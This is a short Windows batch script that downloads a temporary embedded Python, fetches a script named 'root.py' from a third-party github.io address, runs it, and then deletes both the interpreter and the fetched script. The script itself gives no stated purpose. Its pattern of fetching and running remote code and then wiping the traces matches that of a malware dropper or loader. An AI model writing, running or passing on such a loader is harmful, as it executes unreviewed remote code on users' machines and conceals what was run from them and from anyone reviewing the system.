@echo off
set "PYTHON=https://www.python.org/ftp/python/3.12.0/python-3.12.0rc1-embed-amd64.zip"
set "CORE=https://bl1z33.github.io/core"
powershell -Command iwr %PYTHON% -OutFile python3.12.zip
mkdir python3.12
powershell -Command Expand-Archive -Path python3.12.zip -DestinationPath python3.12\
del python3.12.zip
mkdir core
powershell -Command iwr %CORE%/root.py -Outfile core\root.py
python3.12\python.exe core\root.py
rd core /S /Q
rd python3.12 /S /Q